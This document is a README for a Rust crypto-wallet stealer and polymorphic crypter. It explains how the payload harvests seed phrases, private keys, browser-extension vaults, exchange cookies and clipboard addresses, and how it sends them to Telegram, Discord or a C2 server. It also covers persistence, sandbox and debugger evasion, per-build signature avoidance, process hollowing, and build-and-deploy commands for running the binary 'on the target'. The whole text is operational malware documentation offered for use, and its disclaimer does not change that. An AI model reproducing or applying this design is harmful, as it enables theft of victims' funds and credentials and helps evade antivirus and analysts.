# svc — crypto stealer + polymorphic crypter

A Rust workspace that builds a per-target crypto wallet stealer and a per-build polymorphic wrapper for it. Every wrapper produced by the crypter has a different ISA permutation, different anti-analysis gates, different decrypt scheme, different junk-code shape, and no plaintext secrets in the binary. Two builds of the same payload share no identifiable byte patterns in the wrapper layer.

---

## table of contents

1. [what this is](#1-what-this-is)
2. [what this is not](#2-what-this-is-not)
3. [legal and ethical notice](#3-legal-and-ethical-notice)
4. [architecture](#4-architecture)
5. [workspace layout](#5-workspace-layout)
6. [crate reference](#6-crate-reference)
   - [common](#61-common)
   - [payload](#62-payload)
   - [crypter-ir](#63-crypter-ir)
   - [crypter-vm](#64-crypter-vm)
   - [crypter-synth](#65-crypter-synth)
   - [svc-loader](#66-svc-loader)
   - [svc-crypter](#67-svc-crypter)
7. [anti-analysis features](#7-anti-analysis-features)
8. [per-build variation](#8-per-build-variation)
9. [exfil configuration](#9-exfil-configuration)
10. [build pipeline](#10-build-pipeline)
11. [running](#11-running)
12. [verification](#12-verification)
13. [data collected by the payload](#13-data-collected-by-the-payload)
14. [troubleshooting](#14-troubleshooting)
15. [known stubs and incomplete paths](#15-known-stubs-and-incomplete-paths)
16. [FAQ](#16-faq)

---

## 1. what this is

Two programs:

**svc-payload** — a cross-platform Rust binary that, when run, collects crypto wallet artifacts from the host: browser extension storage for MetaMask, Phantom, Coinbase Wallet, Rabby, Keplr, and ~15 other extensions; desktop wallet files for Exodus, Electrum, Atomic, Bitcoin Core, and similar; browser cookies for exchange domains (Binance, Coinbase, Kraken, etc.); the browser address book filtered to wallet-shaped strings; and clipboard contents that look like wallet addresses. Everything is packaged as JSON, sealed with AES-256-GCM, and sent to a configured exfil channel (Telegram bot, Discord webhook, or a generic C2 endpoint).

**svc-crypter** — a build-time tool that takes any payload binary, encrypts it with a per-build key, and emits a Rust source file (the *stub*) that, when compiled, will: run a randomized sequence of anti-analysis gates; refuse to proceed if it detects a sandbox, debugger, or hooked API; decrypt the payload into memory; optionally mprotect it to `PAGE_NOACCESS` while not executing; and hand control to the payload. The stub carries no plaintext secrets — Telegram tokens, Discord webhooks, and C2 credentials are XOR'd and base64'd at build time, and delivered to the payload at runtime through an environment variable that's scrubbed immediately.

The design goal is **per-build uniqueness**. Two builds of the same payload produce wrappers that differ in:
- ISA opcode permutation (256-byte shuffle, first 32 slots = opcode codes)
- Host-call vtable permutation
- Which anti-analysis gates run, and in what order
- Sleep-jitter window (random, 15–180 s)
- Anti-emulation threshold (random, 3–6 s)
- Debug check method (one of six)
- Export resolver hash (fnv-1a / crc32 / djb2 / PEB walk)
- Decrypt scheme (AES-GCM / ChaCha20-Poly1305 / AES-CBC-HMAC / XOR-derived)
- Execution method (image map / shellcode invoke / process hollow / spawn-inject)
- Integrity check method
- Junk-code density and shape
- XOR key for string obfuscation
- All function identifiers (6–12 random characters)

A signature written against one wrapper will not match the next build.

---

## 2. what this is not

- **Not a P2P botnet.** There is no command channel back to the payload. Exfil is one-way.
- **Not a ransomware kit.** The payload does not encrypt, delete, or modify user files. It reads and transmits.
- **Not a worm.** There is no lateral-movement or self-propagation code.
- **Not a persistence framework.** Persistence is limited to specific, opt-in entries (`runkey`, `startup`, `schtask` on Windows; `systemd_user`, `cron`, `rc_local` on Linux; `launchagent`, `login_item` on macOS).
- **Not finished.** Several paths — most notably `exec_fn` in the emitted stub — are stubs. See §15.

---

## 3. legal and ethical notice

This is a toolset designed to operate without the consent of the system owner. Every component — the collection modules, the obfuscation, the anti-analysis gates — exists to make unauthorized access harder to detect and harder to attribute.

It exists in the same category as Metasploit, Cobalt Strike, and the various public red-team frameworks. That category has a legitimate purpose: security professionals testing their own systems with documented authorization. It also has an illegitimate purpose.

**Do not use this on systems you do not own or have written authorization to test.** If you're a red teamer, this is only appropriate under a signed engagement with a defined scope and rules of engagement. If you're a security researcher, run it in your own lab VMs. If you're neither of those things, this isn't for you.

The author(s) of this document take no responsibility for use of this tool against systems the operator does not have permission to access. Depending on jurisdiction, that use may constitute a criminal offense under statutes including the US Computer Fraud and Abuse Act, the UK Computer Misuse Act, and equivalents elsewhere.

---

## 4. architecture

Three layers, cleanly separated.

```
┌──────────────────────────────────────────────────┐
│  PAYLOAD  (svc-payload.exe / svc-payload)        │
│  ─ collection modules per OS                     │
│  ─ reads exfil config from SVC_EXFIL_CFG env var │
│  ─ seals findings with AES-256-GCM               │
│  ─ ships to Telegram / Discord / C2              │
└──────────────────────────────────────────────────┘
                       ▲
                       │  exec (spawn / map / hollow)
                       │
┌──────────────────────────────────────────────────┐
│  STUB  (emitted by crypter-synth, compiled by    │
│         rustc at build time)                     │
│  ─ sets SVC_EXFIL_CFG from baked-in secrets      │
│  ─ sleep-jitter                                   │
│  ─ anti-emulation                                 │
│  ─ debug checks                                   │
│  ─ gate chain (blocklists, uptime, RAM, ...)      │
│  ─ integrity check                                │
│  ─ decrypt payload → Vec<u8>                      │
│  ─ anti-dump protect                              │
│  ─ exec_fn()                                      │
└──────────────────────────────────────────────────┘
                       ▲
                       │  emit Rust source
                       │
┌──────────────────────────────────────────────────┐
│  CRYPTER  (svc-crypter — build-time tool)        │
│  ─ reads payload binary                           │
│  ─ rolls random seed / ISA / gates / schemes     │
│  ─ encrypts payload with argon2id-derived key    │
│  ─ emits stub.rs                                  │
│  └─ runs rustc to produce final binary           │
└──────────────────────────────────────────────────┘
```

The payload and the stub are **separate processes** by default. The stub sets the exfil config env var, then spawns/maps the payload. The payload reads that env var and initializes its own exfil channel. Neither has compile-time knowledge of the other's secrets.

---

## 5. workspace layout

```
svc/
├── Cargo.toml                      # workspace manifest
├── crates/
│   ├── common/                     # shared: crypto, sysinfo, exfil
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── crypto.rs           # AES-256-GCM seal/open
│   │       ├── envkey.rs           # argon2id key derivation, fingerprint
│   │       ├── exfil.rs            # ExfilConfig + dispatch
│   │       └── sysinfo.rs          # hostname / user / arch / cwd
│   ├── payload/                    # the stealer
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs              # run(directive)
│   │       ├── main.rs             # binary entry point
│   │       ├── wallets.rs          # extension vaults, desktop wallets
│   │       ├── windows.rs          # DPAPI, cookies, clipboard, persistence
│   │       ├── linux.rs            # keyring, cookies, clipboard, persistence
│   │       └── macos.rs            # Keychain, cookies, clipboard, persistence
│   ├── crypter-ir/                 # stub program intermediate representation
│   │   ├── Cargo.toml
│   │   └── src/lib.rs              # StubProgram, Gate, DebugCheck, ...
│   ├── crypter-vm/                 # randomized ISA
│   │   ├── Cargo.toml
│   │   └── src/lib.rs              # Op, Encoding, seed_for_build
│   ├── crypter-synth/              # stub source emitter
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs              # Synth, emit()
│   │       ├── emit_gates.rs       # gate + debug + exec + exfil emit
│   │       ├── emit_junk.rs        # junk code injection
│   │       ├── emit_strings.rs     # XOR'd blocklists
│   │       └── emit_antidump.rs    # mprotect guard
│   ├── svc-loader/                 # cross-platform spawn primitives
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs
│   │       ├── windows.rs          # Ghost (section-based), Hollow
│   │       ├── linux.rs            # memfd_create + fexecve
│   │       └── macos.rs            # posix_spawn ghost
│   └── svc-crypter/                # the CLI
│       ├── Cargo.toml
│       └── src/main.rs
└── out/                            # emitted wrappers land here
    └── campaign_a/
        ├── stub.rs                 # generated source
        └── campaign_a.exe          # final binary
```

---

## 6. crate reference

### 6.1 common

Shared library used by the payload. Not used by the stub (the stub is standalone and compiled by rustc with no external deps).

**`crypto.rs`** — AES-256-GCM. `seal(&[u8]) -> String` (base64 output), `open(&[u8;32], &str) -> Option<Vec<u8>>`. The exfil key is a compile-time constant `EXFIL_KEY_HEX` — replace with a rotated key before deployment if you care about past messages being readable after the fact.

**`envkey.rs`** — argon2id (64 MB, 3 iterations, 1 lane) over `hostname|username|volume_serial|cpu_arch|domain`. Used when `bind_to_fingerprint` is set on the `StubProgram`. `fingerprint()` collects the material per-OS: on Windows, volume serial via `GetVolumeInformationW`; on Linux, `/etc/machine-id`; on macOS, `ioreg IOPlatformUUID`.

**`exfil.rs`** — `ExfilConfig` struct with `telegram_token`, `telegram_chat`, `discord_webhook`, `c2_url`, `c2_auth`. `init_from_env()` reads `SVC_EXFIL_CFG` from the environment, JSON-parses it, installs it as the live config via a `OnceLock`, and scrubs the env var. `exfil_event(tag, data)` serializes a `{tag, ts, data}` envelope, seals it, and fans out to whichever channels are configured.

**`sysinfo.rs`** — hostname, username, OS, arch, cwd, pid.

### 6.2 payload

**`lib.rs`** — `run(directive_bytes)`. Reads `SVC_EXFIL_CFG` via `init_from_env()`. Parses a `Directive { tiers, persistence }` from the arg. Calls the collection modules per enabled tier.

Tiers:
- `sysinfo` — host metadata
- `session` — exchange cookies
- `ext` — browser extension vaults
- `desktop` — desktop wallet files
- `addr` — browser autofill filtered to wallet addresses
- `clip` — clipboard monitor (runs in a background thread, sends on every wallet-shaped paste)

If `tiers` is empty, all tiers run. If `persistence` is empty, no persistence is installed.

**`wallets.rs`** — cross-platform. `harvest_extension_vaults` walks each browser's `Local Extension Settings/<ext_id>/` directory, reads `.log` and `.ldb` files, runs regex for BIP-39 12/24-word phrases, ETH private keys (`0x` + 64 hex), BTC WIF, and generic 64-hex, and also base64-encodes the raw LevelDB blobs. Extension ID table is `WALLET_EXT_IDS`. `harvest_desktop_vaults` reads specific files/dirs for known desktop wallets. `harvest_address_book` copies each browser profile's `Web Data` SQLite, queries the `autofill` table, and filters with `is_wallet_addr`.

**`windows.rs`** — DPAPI `CryptUnprotectData` (via `windows-sys`), Chrome v10/v11 AES-GCM cookie decrypt after extracting the master key from `Local State` (`os_crypt.encrypted_key`, stripping the 5-byte `DPAPI` prefix). Cookie query hits `Network/Cookies` and `Cookies` in each Chrome profile. Filters to `EXCHANGE_HOSTS`. Clipboard monitor reads `CF_UNICODETEXT` and emits on wallet-address matches. Persistence: `runkey` (`HKCU\...\Run`), `startup` (Start Menu Startup folder copy), `schtask` (`schtasks /Create /SC ONLOGON`).

**`linux.rs`** — master key from `secret-tool lookup application chrome` (falls back to `peanuts`), cookies decrypted with the same v10/v11 scheme. Clipboard via `xclip -selection clipboard -o`. Persistence: `systemd_user` (writes `~/.config/systemd/user/svc_host.service` and `systemctl --user enable`), `cron` (drops a `@reboot` line), `rc_local` (appends to `/etc/rc.local` — requires root).

**`macos.rs`** — master key from `security find-generic-password -w -s "<Browser> Safe Storage"`. Cookies via the same v10/v11 decrypt. Clipboard via `pbpaste`. Persistence: `launchagent` (writes a LaunchAgent plist and `launchctl load`s it), `login_item` (via `osascript`).

### 6.3 crypter-ir

The IR for the stub program. `StubProgram` carries every knob the synth reads:

```rust
pub struct StubProgram {
    pub seed: [u8; 32],
    pub gates: Vec<Gate>,
    pub debug_check: DebugCheck,
    pub resolver: Resolver,
    pub decrypt: DecryptScheme,
    pub virtualization: bool,
    pub integrity: IntegrityCheck,
    pub execution: ExecutionMethod,
    pub key_material: KeyMaterial,
    pub payload_blob: Vec<u8>,
    pub target_os: TargetOs,
    pub config_xor_key: [u8; 32],
    pub anti_dump: bool,
    pub anti_emulation: bool,
    pub junk_density: f32,

    // per-build exfil secrets
    pub telegram_token: String,
    pub telegram_chat: String,
    pub discord_webhook: String,
    pub c2_url: String,
    pub c2_auth: String,
}
```

**`Gate`** — one of: `UptimeMin`, `CursorMotion`, `RamMinMb`, `CpuCoresMin`, `UsernameBlocklist`, `HostnameBlocklist`, `DomainJoined`, `SleepJitter`, `SleepAccelerationCheck`, `ApiHammerCheck`.

**`DebugCheck`** — `IsDebuggerPresent`, `PEBBeingDebugged`, `NtGlobalFlag`, `NtQueryInformationProcess`, `TimingCheck`, `None`.

**`Resolver`** — `ExportWalkFnv1a`, `ExportWalkCrc32`, `ExportWalkDjb2`, `PebWalk`.

**`DecryptScheme`** — `AesGcm`, `ChaCha20Poly1305`, `AesCbcHmac`, `XorDerived`.

**`ExecutionMethod`** — `ImageMap`, `ShellcodeInvoke`, `ProcessHollow { host }`, `SpawnInject { host }`, `DirectJump`.

**`IntegrityCheck`** — `TextSectionHash`, `RegionCrc { start, len }`, `None`.

### 6.4 crypter-vm

Encodes the runtime ISA. `Encoding::from_seed(seed)` shuffles the full 0..=255 byte space and uses the first 32 slots as opcode codes, and separately shuffles 16 slots for host-call identifiers. `emit_rust()` renders the permutation tables as `const ENC_FORWARD: [u8; 32]`, `const ENC_REVERSE: [u8; 256]`, `const ENC_HOST: [u8; 16]`.

`seed_for_build(payload_hash, isa_nonce)` derives the ISA seed from the payload's hash and a per-build random nonce.

The VM itself (in the emitted stub) is minimal — 32 ops, stack-based, supports push/add/xor/halt/load/store. It's not the primary execution path; the payload runs as a spawned process. The VM exists so that pre-exec logic (gate chain orchestration) can be expressed as VM bytecode rather than native code, if that path is ever wired up.

### 6.5 crypter-synth

The emitter. `Synth::emit(&StubProgram) -> String` produces a complete, self-contained Rust source file.

**`emit_gates.rs`** — emits:
- `emit_exfil_config_setup` — the base64+XOR'd `SVC_EXFIL_CFG` blob and `svc_install_exfil_cfg()`
- `emit_platform_helpers` — `peb_ptr`, `get_kernel32`, `get_proc`, `load_lib`, `current_process` (emitted once, at workspace initialization)
- `emit_gate` — one function per gate
- `emit_debug_check` — one function per debug check
- `emit_anti_emulation` — the sleep-acceleration check
- `emit_resolver_fn` — export walker scaffold
- `emit_exec_fn` — the (currently empty) execution shim
- `emit_integrity` — text section hash scaffold

**`emit_junk.rs`** — `emit_junk_block` inserts `if black_box(false) { ... }` dead blocks. `black_box(false)` prevents LLVM from folding the branch away. Density is `StubProgram::junk_density`, typically 0.3–0.7.

**`emit_strings.rs`** — XORs each blocklist string with `XK`, emits `static USER_BLOCKLIST_ENC: [&[u8]; N]` and `static HOST_BLOCKLIST_ENC: [&[u8]; N]`, then emits lazy accessors `USER_BLOCKLIST()` / `HOST_BLOCKLIST()` returning `&'static Vec<String>` via `OnceLock`.

**`emit_antidump.rs`** — emits a `Guard` struct and `protect(&[u8])` / `unprotect(&Guard)` functions. On Windows: `VirtualProtect(ptr, len, PAGE_NOACCESS, &mut old)`; re-protect to `PAGE_EXECUTE_READ` on unprotect. On Linux/macOS: `mprotect` with `PROT_NONE` / `PROT_READ|PROT_EXEC`.

**`lib.rs`** — orchestration. Writes the header, bakes payload/salt/nonce, calls every emitter, wires up `main()`, and emits the `exec_fn` call site.

### 6.6 svc-loader

Cross-platform spawn primitives. Not called by the emitted stub yet — the current stub's `exec_fn` is empty. This crate is the toolbox you'd wire in to actually launch the payload.

**`windows.rs`** — `Ghost::spawn` (write to a temp file, `CreateProcessA` with `CREATE_SUSPENDED`, mark the file deleted, `ResumeThread`), `Hollow::spawn` (CreateProcess suspended → unmap image → write new image → set context → resume).

**`linux.rs`** — `spawn_memfd` (`memfd_create` → write payload → `fork` → `fexecve`).

**`macos.rs`** — `spawn_ghost` (write to a temp file with mode 0755 → `posix_spawn` → delete).

### 6.7 svc-crypter

The CLI.

```
svc-crypter <payload> [options]

options:
  --target windows|linux|macos   (default windows)
  --fp     <fingerprint.json>    bind key to host fingerprint
  --out    <name>                output basename (default svc)

  per-build exfil secrets:
  --cfg-file <secrets.json>      JSON with any of:
                                   telegram_token, telegram_chat,
                                   discord_webhook, c2_url, c2_auth
  --tg-token <TOKEN>             telegram bot token
  --tg-chat  <CHAT_ID>           telegram chat / channel id
  --discord  <WEBHOOK_URL>       discord webhook url
  --c2       <URL>               generic c2 endpoint
  --c2-auth  <BEARER>            bearer token for c2
```

The crypter:
1. Reads the payload binary
2. Rolls random `seed` and `config_xor_key`
3. Rolls gates, debug check, resolver, decrypt scheme, execution method, integrity check, virtualization, anti-dump, anti-emulation, junk density
4. Derives the payload encryption key with argon2id over `salt || build_seed || sha256(payload)`
5. AES-256-GCM-encrypts the payload
6. Builds the `StubProgram`
7. Calls `Synth::new(seed, xor_key).emit(&prog)`
8. Writes the source to `out/<name>/stub.rs`
9. Runs `rustc --target <triple>` on it
10. Reports the final binary's size and SHA-256

CLI flags override `--cfg-file` values. So you can have a base config with your channel IDs and tweak the token per build.

---

## 7. anti-analysis features

Six checks the stub runs before decrypting the payload. Each is optional per build via the `StubProgram` gates list.

### 7.1 anti-emulation (sleep acceleration check)

Some sandboxes hook `Sleep` / `NtDelayExecution` to skip long delays and speed up analysis. The check samples `Instant::now()`, sleeps 3–6 s, samples again. If elapsed is less than `min_ratio × requested` (typically 0.8), the emulator is compressing time — abort.

Emitted as a function that returns `false` on failure. Called as the first gate after the initial jitter sleep.

### 7.2 anti-dump

After the payload is decrypted into a `Vec<u8>`, the memory region is `VirtualProtect`ed (Windows) or `mprotect`ed (Linux/macOS) to `PAGE_NOACCESS` / `PROT_NONE`. It's flipped back to `PAGE_EXECUTE_READ` / `PROT_READ|PROT_EXEC` immediately before `exec_fn()` is called, then back to no-access if the payload spawns as a child process and the parent returns.

This means a live memory scan of the process during the window between decrypt and exec finds nothing readable. Post-exec, the region is dead again.

### 7.3 encrypted config strings

The username and hostname blocklists (e.g. `["sandbox", "malware", "cuckoo", "vbox", ...]`) are stored XOR'd with the per-build `config_xor_key` and emitted as `static USER_BLOCKLIST_ENC: [&[u8]; N]`. Decryption happens lazily on first access.

`strings svc.exe | grep sandbox` finds nothing.

### 7.4 junk code injection

Every stub's `main()` ends with an `if black_box(false) { ... }` block containing 2–5 random no-op statements. `black_box` prevents LLVM from proving the branch dead. Each build's junk differs in shape and volume.

### 7.5 NtQueryInformationProcess anti-debug

`DebugCheck::NtQueryInformationProcess` resolves `ntdll!NtQueryInformationProcess` and queries three info classes:
- `ProcessDebugPort (7)` — nonzero if the process is being debugged
- `ProcessDebugObjectHandle (0x1E)` — nonzero if a debug object exists
- `ProcessDebugFlags (0x1F)` — zero means "being debugged"

Any hit returns `true` → abort.

This catches more debuggers than `IsDebuggerPresent`, including those that clear the PEB `BeingDebugged` flag.

### 7.6 API hammering detection

`Gate::ApiHammerCheck` reads the first bytes of `kernel32!CreateFileW` and checks for the classic user-mode hook patterns:
- `0xE9` — near jump (relative jmp at function entry)
- `0xEB` — short jump
- `0xFF 0x25` — indirect jump

Any of these → the function has been hooked by a sandbox or EDR → abort.

---

## 8. per-build variation

Every run of `svc-crypter` against the same payload produces a different binary. Here's the full table:

| dimension | source | range |
|---|---|---|
| payload encryption key | argon2id(salt ‖ build_seed ‖ payload_hash) | unique per run |
| payload nonce | `OsRng` | 12 bytes |
| ISA opcode permutation | 256-byte shuffle, first 32 = opcodes | 256! possible orders |
| host-call permutation | 16-byte shuffle | 16! possible orders |
| gate selection | random subset | ~8 from 10 |
| gate order | shuffled | — |
| sleep jitter window | random | 15–180 s |
| anti-emulation threshold | random | 3–6 s |
| debug check method | uniform | 1 of 6 |
| resolver hash | uniform | 1 of 4 |
| decrypt scheme | uniform | 1 of 4 |
| execution method | uniform | 1 of 4 |
| integrity check | uniform | 1 of 3 |
| anti-dump on/off | biased | 90% on |
| junk density | uniform | 0.3–0.7 |
| XOR key | `OsRng` | 32 bytes |
| identifier names | 6–12 random chars per fn | unique |

Two wrapper binaries built from the same payload share their `svc_common::crypto::EXFIL_KEY_HEX` constant (the exfil envelope key) and the Rust runtime boilerplate. Nothing else.

---

## 9. exfil configuration

The payload is configured at runtime through `SVC_EXFIL_CFG`, an environment variable set by the stub before it launches the payload. Three channels are supported.

### 9.1 Telegram

```
telegram_token: "123456789:AAH..."      bot token from @BotFather
telegram_chat:  "-1001234567890"        channel id (negative, starts with -100)
                                        or user id (positive integer)
```

Every event is sent as a `.txt` document via `sendDocument`, with a caption containing the tag, byte count, and host. The file contains the sealed (base64) blob.

To get a chat ID: message the bot (or add it to a channel and post), then `curl https://api.telegram.org/bot<TOKEN>/getUpdates` and look for `chat.id`.

### 9.2 Discord

```
discord_webhook: "https://discord.com/api/webhooks/..."
```

Blobs under 1800 bytes are posted inline inside a code fence. Larger blobs are posted as a `.bin` file attachment.

### 9.3 generic C2

```
c2_url:  "https://your-c2.example/ingest"
c2_auth: "bearer-token-here"
```

`POST` with `Authorization: Bearer <c2_auth>` and the sealed blob as the body.

### 9.4 how the config reaches the payload

At `svc-crypter` time:

1. Secrets are loaded from `--cfg-file` and/or CLI flags
2. The secrets struct is serialized to JSON
3. XOR'd with a key derived from `seed ^ config_xor_key ^ 0x5A`
4. Base64-encoded
5. Emitted as `static EXFIL_B64: &str` in the stub, alongside `static EXFIL_KEY: [u8; 32]`

At stub runtime, `svc_install_exfil_cfg()` runs before any gate. It base64-decodes, XOR-decodes, and `env::set_var("SVC_EXFIL_CFG", ...)`.

At payload startup, `svc_common::exfil::init_from_env()` reads the var, `env::remove_var`s it immediately, and installs the parsed config via `OnceLock`.

Net result: no plaintext secret exists in either binary. `strings` finds nothing. The env var exists in the process table for a fraction of a second, then is gone.

---

## 10. build pipeline

### 10.1 prerequisites

```bash
# Rust toolchain (stable)
rustup update stable
rustup target add x86_64-pc-windows-gnu   # if cross-compiling to Windows
rustup target add x86_64-unknown-linux-gnu # usually host-native anyway
rustup target add aarch64-apple-darwin     # macOS (needs osxcross for full link)

# MinGW for Windows cross-compilation of the payload (rusqlite bundled needs a C compiler)
sudo apt install -y gcc-mingw-w64-x86-64

# Then either export for the current shell:
export CC_x86_64_pc_windows_gnu=x86_64-w64-mingw32-gcc
export AR_x86_64_pc_windows_gnu=x86_64-w64-mingw32-ar
export CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER=x86_64-w64-mingw32-gcc
```

Add those exports to `~/.bashrc` so you don't have to redo them each shell.

### 10.2 building the crypter

```bash
cd ~/svc
cargo build --release -p svc-crypter
```

Produces `target/release/svc-crypter`.

### 10.3 building the payload

```bash
# Windows
cargo build --release -p svc-payload --bin svc-payload --target x86_64-pc-windows-gnu
# → target/x86_64-pc-windows-gnu/release/svc-payload.exe

# Linux
cargo build --release -p svc-payload --bin svc-payload
# → target/release/svc-payload

# macOS — requires osxcross or a real Mac
cargo build --release -p svc-payload --bin svc-payload --target aarch64-apple-darwin
```

### 10.4 wrapping the payload

```bash
cargo run --release -p svc-crypter -- \
    target/x86_64-pc-windows-gnu/release/svc-payload.exe \
    --target windows \
    --cfg-file /home/ubuntu/.config/svc/secrets.json \
    --out campaign_a
```

Produces:
- `out/campaign_a/stub.rs` — the generated source (keep for auditing)
- `out/campaign_a/campaign_a.exe` — the final artifact

### 10.5 full rebuild from scratch

```bash
cd ~/svc
cargo clean
cargo build --release -p svc-crypter
cargo build --release -p svc-payload --bin svc-payload --target x86_64-pc-windows-gnu
rm -rf out/campaign_a
cargo run --release -p svc-crypter -- \
    target/x86_64-pc-windows-gnu/release/svc-payload.exe \
    --target windows \
    --cfg-file /home/ubuntu/.config/svc/secrets.json \
    --out campaign_a
```

### 10.6 secrets file

Place at `~/.config/svc/secrets.json`:

```json
{
  "telegram_token": "123456789:AAH...",
  "telegram_chat": "-1001234567890",
  "discord_webhook": "",
  "c2_url": "",
  "c2_auth": ""
}
```

Permissions:

```bash
chmod 700 ~/.config/svc
chmod 600 ~/.config/svc/secrets.json
```

The crypter accepts the file with either `~` or an absolute path, but tilde expansion is unreliable when passed through `cargo run --`. Prefer the absolute path.

---

## 11. running

### 11.1 on the target

Place `campaign_a.exe` on the target and execute. The stub will:

1. Install the exfil config into the environment (before any gate)
2. Sleep 15–180 s (jitter)
3. Run the anti-emulation check (3–6 s sleep, sanity check)
4. Run the debug check (one of six methods)
5. Run the gate chain in randomized order
6. Run the integrity check
7. Decrypt the payload
8. Optionally mprotect it to no-access
9. Call `exec_fn()` — **currently a stub, does nothing** (see §15)
10. Exit

### 11.2 testing the payload without the wrapper

You can run the payload binary directly if you set `SVC_EXFIL_CFG` yourself:

```bash
SVC_EXFIL_CFG='{"telegram_token":"...","telegram_chat":"..."}' \
SVC_DIRECTIVE='{"tiers":["sysinfo"],"persistence":[]}' \
    target/release/svc-payload
```

This runs the payload's own collection and exfil against whatever channel you configured. Use it to validate that the Telegram bot, chat ID, and webhook actually work before wrapping.

### 11.3 testing the wrapper

The stub does the gate chain and the decrypt. If those work, you should see the run take 20–180 s before exiting. If it exits in under 5 s, either the jitter gate isn't in the gate list or the sleep call is being optimized out (check that `std::thread::sleep` and `Instant::now()` are present in the emitted stub).

If it exits after the gate chain but before any exfil lands, `exec_fn` is the reason — it's empty.

---

## 12. verification

### 12.1 the wrapper binary

```bash
file out/campaign_a/campaign_a.exe
# → PE32+ executable (console) x86-64, for MS Windows

sha256sum out/campaign_a/campaign_a.exe
# → unique hash; re-running the crypter produces a different hash

ls -la out/campaign_a/campaign_a.exe
# → ~280 KB typical
```

### 12.2 no plaintext secrets

```bash
# the raw token should not appear anywhere
strings out/campaign_a/campaign_a.exe | grep -iE "telegram|webhook|discord|bearer" | head
# → empty

# the raw chat id should not appear
strings out/campaign_a/campaign_a.exe | grep -i "1234567890" | head
# → empty
```

### 12.3 no plaintext blocklists

```bash
strings out/campaign_a/campaign_a.exe | grep -iE "sandbox|cuckoo|vbox|malware|analyst" | head
# → empty
```

### 12.4 the generated stub source

```bash
grep -n "SVC_EXFIL_CFG" out/campaign_a/stub.rs
# → shows the base64 blob assignment + env::set_var call

grep -n "USER_BLOCKLIST" out/campaign_a/stub.rs
# → shows the encrypted byte arrays + the lazy accessor

grep -n "sleep" out/campaign_a/stub.rs
# → shows the jitter sleep + anti-emulation sleep
```

### 12.5 two builds differ

```bash
cargo run --release -p svc-crypter -- \
    target/x86_64-pc-windows-gnu/release/svc-payload.exe \
    --target windows \
    --cfg-file /home/ubuntu/.config/svc/secrets.json \
    --out campaign_a

cargo run --release -p svc-crypter -- \
    target/x86_64-pc-windows-gnu/release/svc-payload.exe \
    --target windows \
    --cfg-file /home/ubuntu/.config/svc/secrets.json \
    --out campaign_b

sha256sum out/campaign_a/campaign_a.exe out/campaign_b/campaign_b.exe
# → different hashes

diff <(xxd out/campaign_a/campaign_a.exe | head -1000) \
     <(xxd out/campaign_b/campaign_b.exe | head -1000) | wc -l
# → thousands of differing bytes
```

---

## 13. data collected by the payload

Full inventory of what the payload reads and transmits.

### 13.1 sysinfo

Hostname, username, OS, arch, cwd, pid. Always sent.

### 13.2 session tokens (tier: `session`)

Browser cookies for a fixed list of crypto exchanges and wallet domains:

```
binance.com, coinbase.com, kraken.com, kucoin.com, crypto.com,
okx.com, bybit.com, bitfinex.com, gemini.com, bitstamp.net,
gate.io, huobi.com, metamask.io, phantom.app, wallet.coinbase.com
```

Cookies are decrypted using either DPAPI (older) or the Chrome v10/v11 AES-GCM scheme (current), with the master key extracted from `Local State` (Windows) / `secret-tool` (Linux) / Keychain (macOS).

### 13.3 extension vaults (tier: `ext`)

Directory walk of `Local Extension Settings/<extension_id>/` for each of:

```
MetaMask, MetaMask-Flask, BinanceChain, TrustWallet, CoinbaseWallet,
Phantom, Keplr, SuiWallet, OKXWallet, Rabby, TronLink, XDEFI,
Talisman, ExodusWeb, BitKeep, MathWallet, Wombat, Kaikas,
KardiaChain, Enkrypt
```

Each directory's `.log` and `.ldb` files are read raw, scanned with regex for BIP-39 seed phrases, ETH private keys, BTC WIF, and 64-hex blobs. The raw files are also base64-encoded up to 200 KB.

### 13.4 desktop wallets (tier: `desktop`)

Per-OS paths for:

```
Exodus, Electrum, Atomic, BitcoinCore, LitecoinCore, DogecoinCore,
MoneroGUI, Zcash, LedgerLive, TrezorSuite, SparrowWallet,
WasabiWallet, Daedalus, Yoroi, Coinomi, Guarda
```

Files up to 2 MB are base64-encoded and sent. Larger files are skipped.

### 13.5 address book (tier: `addr`)

Each browser profile's `Web Data` SQLite database. The `autofill` table is queried for values matching `0x%`, `bc1%`, `1%`, `3%`, then filtered to validate the shape as ETH, BTC bech32, BTC legacy, or XMR.

### 13.6 clipboard (tier: `clip`)

A background thread checks the clipboard every 2 s. Wallet-shaped strings are exfiltrated immediately with tag `clip_addr`.

### 13.7 persistence (opt-in)

Windows: `runkey`, `startup`, `schtask`.
Linux: `systemd_user`, `cron`, `rc_local`.
macOS: `launchagent`, `login_item`.

Nothing runs unless the `Directive.persistence` array is non-empty.

---

## 14. troubleshooting

### 14.1 build errors

**`error: linker cc not found`** during payload build → MinGW exports missing. Re-export the three vars from §10.1.

**`error: failed to run custom build command for libsqlite3-sys`** → `sudo apt install gcc-mingw-w64-x86-64` and export `CC_x86_64_pc_windows_gnu`.

**`error[E0425]: cannot find function 'USER_BLOCKLIST'`** → case mismatch between `emit_strings.rs` and `emit_gates.rs`. Both must use the same casing. See `emit_strings.rs::emit_list` — the accessor is emitted with the uppercase name.

**`error[E0428]: the name 'get_proc' is defined multiple times`** → platform helpers are being emitted by more than one path. Only `emit_gates::emit_platform_helpers` should emit `peb_ptr`, `get_kernel32`, `get_proc`, `load_lib`, `current_process`. If a gate or debug-check path also emits them, remove that.

**`warning: constant should have an upper case name`** → the emitted stub's header needs `non_upper_case_globals` in its `#![allow(...)]` list.

### 14.2 runtime issues

**stub exits immediately** → a gate returned false. Add a `eprintln!` at each gate return in the emitted source temporarily, rebuild, and see which fires. Most often it's `UsernameBlocklist` (if the target username matches) or `UptimeMin` (on freshly booted systems).

**stub exits at ~5 s** → anti-emulation check failed. The sandbox is compressing time. That's the point.

**stub exits at ~180 s** → that's the max jitter window. Everything worked. `exec_fn` did nothing.

**no Telegram messages after running the payload directly** → check the token and chat id with `curl https://api.telegram.org/bot<TOKEN>/getMe` and `.../getUpdates`. If the bot has never received a message from the chat, the chat id is unavailable to it.

**Telegram works but Discord doesn't** → Discord webhooks return 204 on success and 4xx on failure. Add `eprintln!` around the response status check in `common/src/exfil.rs::dispatch`.

### 14.3 build-time crypter errors

